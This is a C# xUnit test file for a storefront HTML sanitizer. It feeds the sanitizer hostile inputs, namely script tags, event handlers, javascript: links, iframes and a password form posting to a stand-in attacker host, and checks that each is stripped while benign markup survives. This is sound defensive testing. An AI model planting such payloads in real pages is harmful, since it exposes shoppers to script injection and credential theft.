using FluentAssertions;
using StockApi.Content;
using Xunit;

namespace StockApi.Tests.Content;

/// <summary>
/// SiteContent.BodyHtml renders as markup on the storefront, and since T9 every admin of a store
/// can write it. Each of these is something that would be on a customer's screen in the store's
/// own name if the allow-list let it through.
/// </summary>
public class ContentHtmlTests
{
    [Theory]
    [InlineData("<script>alert(1)</script><p>Hi</p>", "<script")]
    [InlineData("<p onclick=\"steal()\">Hi</p>", "onclick")]
    [InlineData("<a href=\"javascript:steal()\">Pay</a>", "javascript:")]
    [InlineData("<form action=\"https://evil.example/collect\"><input name=\"password\"></form>", "<form")]
    [InlineData("<form action=\"https://evil.example/collect\"><input name=\"password\"></form>", "<input")]
    [InlineData("<iframe src=\"https://evil.example\"></iframe>", "<iframe")]
    [InlineData("<p style=\"position:fixed;inset:0\">Sign in again</p>", "style")]
    [InlineData("<a class=\"btn btn-primary\" href=\"https://evil.example\">Sign in</a>", "class")]
    [InlineData("<img src=\"http://insecure.example/x.png\">", "http://")]
    public void WhatCouldActOnACustomerIsRemoved(string html, string mustNotRemain)
    {
        ContentHtml.Sanitize(html).Should().NotContain(mustNotRemain);
    }

    [Theory]
    [InlineData("<h2>Delivery</h2><p>We ship <strong>daily</strong>.</p>")]
    [InlineData("<p>See our <a href=\"/terms\">terms</a>.</p>")]
    [InlineData("<p><a href=\"mailto:sales@example.com\">Email us</a></p>")]
    [InlineData("<p><a href=\"https://example.com/datasheet.pdf\">Datasheet</a></p>")]
    [InlineData("<img src=\"https://images.example.com/logo.png\" alt=\"Logo\">")]
    [InlineData("<ul><li>One</li><li>Two</li></ul>")]
    public void OrdinaryContentSurvivesIntact(string html)
    {
        ContentHtml.Sanitize(html).Should().Be(html);
    }

    [Fact]
    public void NothingStaysNothing()
    {
        ContentHtml.Sanitize(null).Should().BeNull();
        ContentHtml.Sanitize("  ").Should().Be("  ");
    }
}
